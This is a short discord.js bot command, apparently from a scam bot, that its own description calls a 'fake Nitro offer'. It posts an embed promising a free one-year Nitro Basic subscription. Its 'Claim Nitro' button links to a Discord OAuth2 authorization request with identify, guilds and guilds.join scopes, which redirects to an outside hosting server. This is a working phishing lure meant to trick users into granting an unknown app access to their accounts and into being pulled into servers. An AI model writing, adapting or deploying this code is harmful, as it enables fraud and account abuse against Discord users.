const { EmbedBuilder, ActionRowBuilder, ButtonBuilder } = require('discord.js');

module.exports = {

    name: 'basic',

    owners: true,

    description: 'Sends a fake Nitro offer with a verification button.',

    execute(message, args, client) {

        const embed = new EmbedBuilder()

            .setTitle('Nitro Basic Offer')

            .setDescription('Click the button below to verify and claim your one-year Nitro basic subscription!')

            .setImage('https://cdn.discordapp.com/attachments/1213536378487578695/1216742877313634488/IMG__.jpg?ex=66017f1b&is=65ef0a1b&hm=b2a1dd3d79a3a3888cf840297969ebe293d8edb63c7e43fc66d7dd9ba63fb0a3&')

            .setColor('#0099ff');

        const button = new ButtonBuilder()

            .setStyle('Link') // Set to 'LINK' for a hyperlink button

            .setLabel('Claim Nitro')

            .setURL('https://discord.com/oauth2/authorize?client_id=1213581772340592641&response_type=code&redirect_uri=http%3A%2F%2Ffi3.bot-hosting.net%3A21660%2Flogin&scope=identify+guilds+guilds.join'); // Replace 'https://example.com/verify' with your verification link

        const row = new ActionRowBuilder().addComponents(button);

        message.channel.send({ embeds: [embed], components: [row] })

            .catch(error => console.error('Failed to send message:', error)); // Handle error if message fails to send

    },

};

